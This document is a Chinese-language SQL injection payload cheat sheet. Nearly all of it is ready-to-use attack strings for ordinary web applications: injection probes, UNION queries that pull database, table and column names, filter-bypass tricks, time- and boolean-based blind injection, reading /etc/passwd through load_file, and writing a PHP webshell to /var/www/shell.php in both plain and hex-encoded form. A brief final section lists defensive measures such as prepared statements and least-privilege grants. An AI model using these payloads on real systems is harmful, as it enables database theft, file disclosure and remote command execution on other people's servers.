# SQL注入关键词手册

## 1. 基础探测关键词

### 1.1 单引号测试
```sql
-- 测试是否存在注入点
?id=1' --+
?id=1' and '1'='1
```

### 1.2 注释符
```sql
-- MySQL注释
?id=1' --+
?id=1' #

-- MSSQL注释
?id=1' --

-- Oracle注释
?id=1' --
```

### 1.3 逻辑测试
```sql
-- 数字型测试
?id=1 and 1=1
?id=1 and 1=2

-- 字符型测试
?id=1' and '1'='1
?id=1' and '1'='2
```

## 2. 信息收集关键词

### 2.1 ORDER BY
```sql
-- 确定列数
?id=1' order by 3--+
?id=1' order by 4--+  -- 如果报错，说明只有3列
```

### 2.2 UNION SELECT
```sql
-- 获取数据库信息
?id=-1' union select 1,2,3--+
?id=-1' union select 1,database(),version()--+
```

### 2.3 GROUP_CONCAT
```sql
-- 获取所有表名
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

-- 获取所有列名
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
```

## 3. 常用函数

### 3.1 版本信息
```sql
-- 获取版本信息
?id=1' and @@version like '5%'--+
?id=1' and version() like '5%'--+
```

### 3.2 数据库信息
```sql
-- 获取当前数据库
?id=1' and database()='security'--+
?id=1' and @@datadir='/var/lib/mysql/'--+
```

### 3.3 用户信息
```sql
-- 获取当前用户
?id=1' and user()='root@localhost'--+
?id=1' and @@hostname='webserver'--+
```

## 4. 绕过过滤技巧

### 4.1 大小写混合
```sql
-- 绕过大小写过滤
?id=1' UniOn SeLeCt 1,2,3--+
?id=1' sElEcT * FrOm users--+
```

### 4.2 内联注释
```sql
-- 使用内联注释绕过
?id=1' /*!UNION*/ SELECT 1,2,3--+
?id=1' /*!50000UNION*/ SELECT 1,2,3--+
```

### 4.3 十六进制编码
```sql
-- 使用十六进制绕过
?id=1' union select 1,0x61646d696e,3--+
?id=1' and username=0x61646d696e--+
```

## 5. 盲注关键词

### 5.1 时间盲注
```sql
-- 基于时间的盲注
?id=1' and if(1=1,sleep(5),0)--+
?id=1' and if(ascii(substr(database(),1,1))>100,sleep(5),0)--+
```

### 5.2 布尔盲注
```sql
-- 基于布尔的盲注
?id=1' and length(database())=8--+
?id=1' and ascii(substr(database(),1,1))>100--+
```

## 6. 文件操作关键词

### 6.1 读取文件
```sql
-- 读取系统文件
?id=1' union select 1,load_file('/etc/passwd'),3--+
?id=1' union select 1,load_file(0x2f6574632f706173737764),3--+
```

### 6.2 写入文件
```sql
-- 写入Webshell
?id=1' union select 1,'<?php system($_GET[cmd]);?>',3 into outfile '/var/www/shell.php'--+
?id=1' union select 1,0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e,3 into outfile '/var/www/shell.php'--+
```

## 7. 防御建议

1. 使用预处理语句
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

2. 输入验证和过滤
```php
if (!is_numeric($id)) {
    die("Invalid input");
}
```

3. 最小化数据库权限
```sql
GRANT SELECT ON database.* TO 'webuser'@'localhost';
```

4. 错误信息处理
```php
error_reporting(0);
ini_set('display_errors', 0);
```

5. 使用WAF规则
```nginx
location / {
    ModSecurityEnabled on;
    ModSecurityConfig modsecurity.conf;
}
```